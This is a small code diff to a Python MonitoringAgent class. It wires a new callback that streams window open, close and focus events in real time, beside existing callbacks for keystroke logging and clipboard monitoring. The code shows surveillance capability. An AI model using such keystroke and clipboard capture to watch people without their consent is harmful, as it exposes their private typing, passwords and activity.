@@ -40,7 +40,8 @@ class MonitoringAgent:
         )
         self.window_tracker = WindowTracker(
             self._on_event, 
-            keystroke_logger=self.keystroke_logger
+            keystroke_logger=self.keystroke_logger,
+            live_window_callback=self._on_live_window_event
         )
         self.clipboard_monitor = ClipboardMonitor(
             self._on_event,
@@ -68,6 +69,10 @@ class MonitoringAgent:
     def _on_live_keystroke(self, event: dict):
         """Callback for real-time keystroke streaming"""
         self.sender.send_live_keystroke(event)
+    
+    def _on_live_window_event(self, event: dict):
+        """Callback for real-time window events (open/close/focus)"""
+        self.sender.send_live_window_event(event)
     
     def start(self):
         """Start all monitoring modules"""
